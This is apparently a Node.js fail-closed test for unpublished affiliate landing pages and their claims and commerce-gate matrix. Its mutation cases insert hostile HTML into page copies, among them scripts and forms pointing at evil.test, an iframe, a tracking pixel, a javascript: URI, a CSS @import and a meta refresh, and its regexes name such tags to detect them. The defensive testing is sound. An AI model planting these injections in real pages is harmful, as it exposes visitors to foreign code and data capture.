/* Final Vestige Mind R282 source-level fail-closed test.
   node mind/r282/verify_r282.cjs
   No merchant request, CMS write, network call, analytics insertion or payment is made.
   Source checks are not full HTML parser, browser a11y, WP sanitizer or payment verification. */
"use strict";
const fs=require("node:fs"), path=require("node:path");
const dir=__dirname;
function read(f){return fs.readFileSync(path.join(dir,f),"utf8")}
const originals={
 A:read("ZEN12-WHITE-BEAR-BUYER-A-UNPUBLISHED.html"),
 B:read("ZEN12-WHITE-BEAR-BUYER-B-UNPUBLISHED.html"),
 article:read("THE-SECOND-WORD-THAT-NEVER-ARRIVED-REPETITION-BLINDNESS-UNPUBLISHED.md"),
 matrix:JSON.parse(read("WHITE-BEAR-PRODUCT-CLAIM-COMMERCE-GATES.json"))
};
const gateIDs=[
"named_FV_partner_acceptance","current_signed_affiliate_terms","permitted_website_channel",
"permitted_organic_social_channel","permitted_email_channel_if_used","issued_earning_URL",
"tracking_parameter_rules","current_exact_offer_page","authenticated_cart_total",
"refundable_item_terms","verified_refund_fulfillment_process","creative_audio_video_rights",
"substantiation_for_any_claim","full_browsers_a11y_security_QA","founder_release_approval",
"merchant_reported_settled_commissions"];
const allowed=new Set([
"https://pubmed.ncbi.nlm.nih.gov/3612492/","https://pubmed.ncbi.nlm.nih.gov/8121959/",
"https://pubmed.ncbi.nlm.nih.gov/37205669/","https://zen12.com/hnp",
"https://zen12.com/freeaudio","https://hypnosislive.com/mental-skills/total-focus",
"https://hypnosislive.com/faq","https://brainwaveshots.com/focus-shot",
"https://finalvestige.com/focus/","https://finalvestige.com/2026/11/02/change-blindness/",
"https://finalvestige.com/2026/11/02/mesmerism/",
"https://finalvestige.com/free-resources/puysegurs-animal-magnetism-files/",
"https://www.ftc.gov/business-guidance/resources/ftcs-endorsement-guides-what-people-are-asking",
"https://www.ftc.gov/business-guidance/resources/health-products-compliance-guidance",
"#main"]);
const clone=o=>JSON.parse(JSON.stringify(o));
const squish=s=>String(s).replace(/\s+/g," ").trim();
function verify(bundle){
 const issues=[],bad=x=>issues.push(x);const {A,B,article,matrix:m}=bundle;
 if(m.publication!=="UNPUBLISHED"||m.commercial_mode!=="HARD_HOLD")bad("Commercial publication hold");
 if(m.sources?.length!==18||new Set(m.sources.map(x=>x.id)).size!==18)bad("Source IDs/count");
 if(m.claims?.length!==24||new Set(m.claims.map(x=>x.id)).size!==24)bad("Claims IDs/count");
 const sid=new Set(m.sources.map(x=>x.id));
 if(m.sources.some(x=>!/^https:\/\//.test(x.url)))bad("Insecure source");
 if(m.claims.some(x=>x.sources?.some(z=>!sid.has(z))))bad("Broken claim provenance");
 if(m.commercial_gates?.length!==16||
    JSON.stringify(m.commercial_gates.map(g=>g.id).sort())!==JSON.stringify([...gateIDs].sort())||
    m.commercial_gates.some(g=>g.status!=="HARD_HOLD"))bad("Exact 16 commercial gates");
 if(m.offers?.length!==5||m.offers.some(o=>o.affiliate_url!==null||o.sale==="VERIFIED"||o.approval==="APPROVED"))bad("False merchant/FV approval");
 if(!m.offers.some(o=>o.id==="fv_paid_mind_product_fallback"&&o.exact_official_page===null))bad("Paid fallback invented");
 if(m.pilot?.active!==false||m.pilot?.affiliate_earning_link!==null||
    m.pilot?.paid_sales_confirmed!==null||m.pilot?.commission_settlement_confirmed!==null||
    m.pilot?.run_status!=="NOT_LIVE"||m.pilot?.merchant_signup_separate_from_FV!==true)bad("Pilot not held");
 if(m.measurement?.no_new_script!==true||m.measurement?.no_pii!==true||
    m.measurement?.affiliate_click_is_sale!==false||
    m.measurement?.focus_confirmed_subscriber_is_sale!==false||
    m.measurement?.net_revenue_per_1000_qualified_sessions!=="NOT_COMPUTABLE_MISSING_CONFIRMED_INPUTS")bad("Measurement misrepresentation");
 if(m.creator_topic_fit?.length!==3||m.creator_topic_fit.some(x=>x.private_grok_asset_id!==null))bad("Invented Grok asset");
 if(m.claims.find(c=>c.id==="CB09")?.classification!=="UNSUBSTANTIATED_PRODUCT_SPECIFIC")bad("Zen12 equivalence magically proven");
 if(m.claims.find(c=>c.id==="CB17")?.classification!=="SELLER_RECRUITMENT")bad("Generic public payout treated as commission proof");
 if(!article.includes("Kanwisher")||!article.includes("repetition blindness")||!article.includes("Puységur")||!article.includes("clinical"))bad("Investigation markers");
 if(article.trim().split(/\s+/).length<2000)bad("Thin investigation");
 if(/(?:I (?:have|personally) (?:used|tested)|guaranteed (?:clinical|health)|proven to cure)/i.test(article))bad("Invented testimony or medical guarantee");
 const primary= s=>s.match(/<main id="main">([\s\S]*?)<\/main>/i)?.[1];
 if(!primary(A)||squish(primary(A))!==squish(primary(B)))bad("A/B buyer copy differs or missing");
 for(const [label,html] of [["A",A],["B",B]]){
  if(!html.includes('data-experiment="'+label+'"')||!html.includes('data-publication="unpublished"')||!html.includes('data-commerce="hold"')||!html.includes('content="noindex,nofollow"'))bad(label+": publication safety metadata");
  if(/<\s*(?:script|form|iframe|input|object|embed|video|audio|source|track|img|link)\b/i.test(html)||/\b(?:onload|onclick|onerror|srcdoc|srcset|formaction|xlink:href|src)\s*=/i.test(html))bad(label+": forbidden active tag/attribute");
  if(/(?:javascript:|data:text\/html|@import|url\s*\()/i.test(html))bad(label+": hidden resource");
  if(/<meta[^>]+http-equiv\s*=\s*['"]?refresh/i.test(html))bad(label+": refresh");
  if(/target\s*=\s*['"]?_blank/i.test(html))bad(label+": unexpected new window");
  const links=[...html.matchAll(/\bhref\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/gi)].map(x=>x[1]??x[2]??x[3]);
  if(links.some(x=>!allowed.has(x)))bad(label+": unapproved external link");
  if(/<button\b/i.test(html)&&!/<button[^>]*\bdisabled\b[^>]*\baria-disabled="true"/i.test(html))bad(label+": purchase control enabled");
  const disclosure=html.indexOf("Potential affiliate relationship:"),button=html.indexOf("<button");
  if(disclosure<0||button<0||button-disclosure>700||button<disclosure)bad(label+": adjacent FTC disclosure");
  if(!html.includes("No affiliate purchasing link is currently active")||!html.includes("not independently substantiated")||
     !html.includes("Zen12's newsletter")||!html.includes("annual")&&!html.includes("annually"))bad(label+": seller/consent/efficacy limitation");
 }
 if(A.includes('class="film"'))bad("Text control contains film");
 if(!B.includes('class="film"')||!B.includes("NOT PLAYABLE")||!B.includes("No MP4, WebM"))bad("B film status fabricated");
 const intervals=[...B.matchAll(/<time>([0-9]{2}:[0-9]{2})–([0-9]{2}:[0-9]{2})<\/time>/g)].map(z=>z.slice(1,3));
 if(intervals.length!==7||JSON.stringify(intervals)!==JSON.stringify([
 ["00:00","00:06"],["00:06","00:12"],["00:12","00:18"],["00:18","00:24"],
 ["00:24","00:30"],["00:30","00:36"],["00:36","00:42"]]))bad("B transcript timing");
 return issues;
}
const baseline=verify(originals);
if(baseline.length){console.error("BASELINE FAIL",baseline);process.exitCode=1;}
else console.log("BASELINE PASS");
const mods=[
 ["permission released",b=>b.matrix.commercial_gates[0].status="APPROVED"],
 ["permission dropped",b=>b.matrix.commercial_gates.pop()],
 ["permission renamed",b=>b.matrix.commercial_gates[0].id="not_a_gate"],
 ["false merchant acceptance",b=>b.matrix.offers[0].approval="APPROVED"],
 ["aff link inserted",b=>b.matrix.offers[0].affiliate_url="https://example.org/?ref=abc"],
 ["false paid sale",b=>b.matrix.offers[0].sale="VERIFIED"],
 ["fictional paid FV Mind offer",b=>b.matrix.offers[4].exact_official_page="https://fake.test/cart"],
 ["unheld mode",b=>b.matrix.commercial_mode="ACTIVE"],
 ["fictional settlement",b=>b.matrix.pilot.commission_settlement_confirmed=100],
 ["false pilot active",b=>b.matrix.pilot.active=true],
 ["link in pilot",b=>b.matrix.pilot.affiliate_earning_link="https://fake.test/a"],
 ["affiliate click as paid sale",b=>b.matrix.measurement.affiliate_click_is_sale=true],
 ["lead as paid sale",b=>b.matrix.measurement.focus_confirmed_subscriber_is_sale=true],
 ["new tracking script",b=>b.matrix.measurement.no_new_script=false],
 ["missing source",b=>b.matrix.sources.pop()],
 ["broken claim source",b=>b.matrix.claims[0].sources=["missing"]],
 ["unsubstantiated efficacy promoted",b=>b.matrix.claims.find(c=>c.id==="CB09").classification="VERIFIED"],
 ["recruitment promoted",b=>b.matrix.claims.find(c=>c.id==="CB17").classification="VERIFIED_COMMISSIONS"],
 ["invented Grok ID",b=>b.matrix.creator_topic_fit[0].private_grok_asset_id="fake"],
 ["A changes buyer copy",b=>b.A=b.A.replace("four different outcomes","seven different outcomes")],
 ["B changes buyer copy",b=>b.B=b.B.replace("twelve-level","four-level")],
 ["A enabled button",b=>b.A=b.A.replace(" disabled aria-disabled"," aria-disabled")],
 ["B enabled button",b=>b.B=b.B.replace(" disabled aria-disabled"," aria-disabled")],
 ["A lost disclosure",b=>b.A=b.A.replace("Potential affiliate relationship:","Disclosure hidden:")],
 ["B moved disclosure",b=>b.B=b.B.replace("Potential affiliate relationship:","Disclosure hidden:")],
 ["A merchant tracking URL",b=>b.A=b.A.replace("https://zen12.com/hnp","https://zen12.com/hnp?ref=unapproved")],
 ["B javascript URI",b=>b.B=b.B.replace("https://zen12.com/hnp","javascript:alert(1)")],
 ["A external script",b=>b.A=b.A.replace("</body>",'<script src="https://evil.test/a.js"></script></body>')],
 ["B extra subscriber form",b=>b.B=b.B.replace("</body>",'<form action="https://evil.test"><input type=email></form></body>')],
 ["A tracking pixel",b=>b.A=b.A.replace("</body>",'<img src="https://pixel.test/x"></body>')],
 ["B iframe",b=>b.B=b.B.replace("</body>",'<iframe src="https://evil.test"></iframe></body>')],
 ["A handler",b=>b.A=b.A.replace("<main id=",'<main onload="bad()" id=')],
 ["B source field",b=>b.B=b.B.replace("<main id=",'<main srcset="https://evil.test" id=')],
 ["B missing segment",b=>b.B=b.B.replace("00:36–00:42","00:36–00:41")],
 ["A adds film",b=>b.A=b.A.replace("<main id=",'<div class="film"></div><main id=')],
 ["B fake playable",b=>b.B=b.B.replace("No MP4, WebM","MP4 now hosted")],
 ["thin article",b=>b.article="A short note about a white bear."],
 ["unverified testimony",b=>b.article+="\nI have used Zen12 daily to cure anxiety."],
 ["A CSS external",b=>b.A=b.A.replace("</style>","@import url('https://evil.test/x');</style>")],
 ["B meta refresh",b=>b.B=b.B.replace("</head>",'<meta http-equiv="refresh" content="0;url=https://evil.test"></head>')],
 ["B automatic audio",b=>b.B=b.B.replace("</body>","<audio autoplay></audio></body>")]
];
let caught=0,missed=[];
for(const [name,mutate] of mods){const sample=clone(originals);mutate(sample);if(verify(sample).length)caught++;else missed.push(name)}
console.log("ADVERSARIAL MUTATIONS REJECTED",caught,"/",mods.length);
if(missed.length){console.error("MISSED",missed);process.exitCode=1}
if(process.exitCode)process.exit(process.exitCode);
